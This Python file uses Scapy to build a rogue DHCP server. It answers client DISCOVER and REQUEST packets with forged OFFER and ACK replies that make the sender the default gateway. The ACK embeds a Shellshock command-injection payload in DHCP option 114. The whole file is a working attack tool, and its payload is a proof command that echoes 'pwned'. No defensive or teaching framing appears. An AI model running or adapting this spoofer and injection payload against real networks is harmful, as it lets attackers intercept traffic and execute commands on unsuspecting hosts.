from __future__ import print_function
import binascii
from scapy.all import *
from scapy.layers.dhcp import DHCP, BOOTP
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether

__version__ = "0.0.3"


class DhcpSpoofing:
    def __init__(self,network_interface: str, host_ip_address: str):
        self.my_real_ip = '192.168.0.102'
        self.broadcast_ip = '255.255.255.255'
        self.fake_my_ip = '192.168.0.38'
        self.fake_your_ip = '192.168.0.76'
        self.fake_server_ip = self.my_real_ip
        self.fake_subnet_mask = '255.255.255.0'
        self.fake_router_ip = self.my_real_ip  # default gateway
        self.fake_lease_time = 192800
        self.fake_renewal_time = 186400
        self.fake_rebinding_time = 138240
        self.network_interface = network_interface
        self.command = "echo 'pwned'"

    def start_dhcp_spoofing(self):
        sniff(iface=self.network_interface, filter="udp and (port 67 or 68)", prn=self.__handle_dhcp_packet)

    def __build_dhcp_offer_packet(self, raw_mac, xid, packet):
        packet = (Ether(src=get_if_hwaddr(self.network_interface), dst='ff:ff:ff:ff:ff:ff') /
                  IP(src=self.fake_my_ip, dst=self.broadcast_ip) /
                  UDP(sport=67, dport=68) /
                  BOOTP(op='BOOTREPLY', chaddr=raw_mac, yiaddr=self.fake_your_ip, siaddr=self.fake_server_ip, xid=xid) /
                  DHCP(options=[("message-type", "offer"),
                                ('server_id', self.fake_server_ip),
                                ('subnet_mask', self.fake_subnet_mask),
                                ('router', self.fake_router_ip),
                                ('lease_time', self.fake_lease_time),
                                ('renewal_time', self.fake_renewal_time),
                                ('rebinding_time', self.fake_rebinding_time),
                                "end"]))

        return packet

    def __build_dhcp_ack_packet(self, raw_mac, xid, packet):
        packet = (Ether(src=get_if_hwaddr(self.network_interface), dst='ff:ff:ff:ff:ff:ff') /
                  IP(src=self.fake_my_ip, dst='255.255.255.255') /
                  UDP(sport=67, dport=68) /
                  BOOTP(op='BOOTREPLY', chaddr=raw_mac, yiaddr=self.fake_your_ip, siaddr=self.fake_server_ip, xid=xid) /
                  DHCP(options=[("message-type", "ack"),
                                ('server_id', self.fake_server_ip),
                                ('subnet_mask', self.fake_subnet_mask),
                                ('router', self.fake_router_ip),
                                ('lease_time', self.fake_lease_time),
                                ('renewal_time', self.fake_renewal_time),
                                ('rebinding_time', self.fake_rebinding_time),
                                (114, b"() { ignored;}; " + b"echo \'pwned\'"),
                                "end"]))

        return packet

    def __send_rogue_dhcp_offer_packet(self, packet):
        mac_addr = packet[Ether].src
        raw_mac = binascii.unhexlify(mac_addr.replace(":", ""))
        xid = packet[BOOTP].xid
        print("[*] Got dhcp DISCOVER from: " + mac_addr + " xid: " + hex(xid))
        print('XXXXXXXXXXXXXX Rogue OFFER packet on BUILD XXXXXXXXXXXXXX')
        new_packet = self.__build_dhcp_offer_packet(raw_mac, xid, packet)
        print("\n[*] Sending Rogue OFFER...")
        sendp(new_packet, iface=self.network_interface)
        print('XXXXXXXXXXXXXXX  Rogue OFFER packet SENT XXXXXXXXXXXXXX')
        return

    def __send_rogue_dhcp_ACK_packet(self, packet):
        mac_address = packet[Ether].src
        raw_mac_address = binascii.unhexlify(mac_address.replace(":", ""))
        xid = packet[BOOTP].xid
        print("[*] Got dhcp REQUEST from: " + mac_address + " xid: " + hex(xid))
        print('XXXXXXXXXXXXXX Rogue ACK packet on BUILD XXXXXXXXXXXXXX')
        new_packet = self.__build_dhcp_ack_packet(raw_mac_address, xid, self.command )
        print("\n[*] Sending ACK...")
        sendp(new_packet, iface=self.network_interface)
        print('XXXXXXXXXXXXXX Rogue ACK packet SENT XXXXXXXXXXXXXX')
        return

    def __handle_dhcp_packet(self, packet):

        # Match DHCP discover
        if DHCP in packet and packet[DHCP].options[0][1] == 1:
            print(packet.command())
            print('---')
            print('New GOOD DHCP Discover')
            hostname = self.__get_dhcp_option(packet[DHCP].options, 'hostname')
            print(f"Host {hostname} ({packet[Ether].src}) asked for an IP")

            # Sending rogue offer packet
            self.__send_rogue_dhcp_offer_packet(packet)

        # Match DHCP offer
        elif DHCP in packet and packet[DHCP].options[0][1] == 2:
            print('---')
            print('New GOOD DHCP Offer')

            subnet_mask = self.__get_dhcp_option(packet[DHCP].options, 'subnet_mask')
            lease_time = self.__get_dhcp_option(packet[DHCP].options, 'lease_time')
            router = self.__get_dhcp_option(packet[DHCP].options, 'router')
            name_server = self.__get_dhcp_option(packet[DHCP].options, 'name_server')
            domain = self.__get_dhcp_option(packet[DHCP].options, 'domain')

            print(f"DHCP Server {packet[IP].src} ({packet[Ether].src}) "
                  f"offered {packet[BOOTP].yiaddr}")

            print(f"DHCP Options: subnet_mask: {subnet_mask}, lease_time: "
                  f"{lease_time}, router: {router}, name_server: {name_server}, "
                  f"domain: {domain}")

        # Match DHCP request
        elif DHCP in packet and packet[DHCP].options[0][1] == 3:
            print('---')
            print('New GOOD DHCP Request')

            requested_address = self.__get_dhcp_option(packet[DHCP].options, 'requested_addr')
            hostname = self.__get_dhcp_option(packet[DHCP].options, 'hostname')
            print(f"Host {hostname} ({packet[Ether].src}) requested {requested_address}")

            # sending rogue ack packet
            self.__send_rogue_dhcp_ACK_packet(packet)

        # Match DHCP ack
        elif DHCP in packet and packet[DHCP].options[0][1] == 5:
            print('---')
            print('New GOOD DHCP Ack')

            subnet_mask = self.__get_dhcp_option(packet[DHCP].options, 'subnet_mask')
            lease_time = self.__get_dhcp_option(packet[DHCP].options, 'lease_time')
            router = self.__get_dhcp_option(packet[DHCP].options, 'router')
            name_server = self.__get_dhcp_option(packet[DHCP].options, 'name_server')

            print(f"DHCP Server {packet[IP].src} ({packet[Ether].src}) "
                  f"acked {packet[BOOTP].yiaddr}")

            print(f"DHCP Options: subnet_mask: {subnet_mask}, lease_time: "
                  f"{lease_time}, router: {router}, name_server: {name_server}")

        # Match DHCP inform
        elif DHCP in packet and packet[DHCP].options[0][1] == 8:
            print('---')
            print('New GOOD DHCP Inform')

            hostname = self.__get_dhcp_option(packet[DHCP].options, 'hostname')
            vendor_class_id = self.__get_dhcp_option(packet[DHCP].options, 'vendor_class_id')

            print(f"DHCP Inform from {packet[IP].src} ({packet[Ether].src}) "
                  f"hostname: {hostname}, vendor_class_id: {vendor_class_id}")

        else:
            print('---')
            print('Some Other DHCP Packet')

        return

    def __get_dhcp_option(self, dhcp_options, key):
        must_decodes_keys = ['hostname', 'domain', 'vendor_class_id']
        try:
            for item in dhcp_options:
                if item[0] == key:
                    # If DHCP Server Returned multiple name servers
                    # return all as comma seperated string.
                    if key == 'name_server' and len(item) > 2:
                        return ",".join(item[1:])
                    # domain and hostname are binary strings,
                    # decode to unicode string before returning
                    elif key in must_decodes_keys:
                        return item[1].decode()
                    else:
                        return item[1]
        except:
            pass
